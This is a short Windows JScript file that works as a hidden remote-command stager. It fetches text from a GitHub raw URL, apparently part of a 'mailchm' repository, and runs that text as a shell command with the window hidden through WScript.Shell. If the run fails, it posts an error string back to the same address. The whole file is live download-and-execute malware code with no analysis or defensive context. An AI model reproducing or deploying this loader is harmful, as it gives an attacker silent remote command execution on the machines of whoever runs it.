h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.SetTimeouts(0, 0, 0, 0);
try {
h.Open("GET","https://github.com/wangzhizhun/mailchm/raw/master/cmd",false);
h.Send();
c = h.ResponseText;
r = new ActiveXObject("WScript.Shell").Run(c,0,true);
} catch(e1) {
p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
p.SetTimeouts(0, 0, 0, 0);
p.Open("POST","https://github.com/wangzhizhun/mailchm/raw/master/cmd",false);
p.Send("[Some thing wrong !! ]\n");
}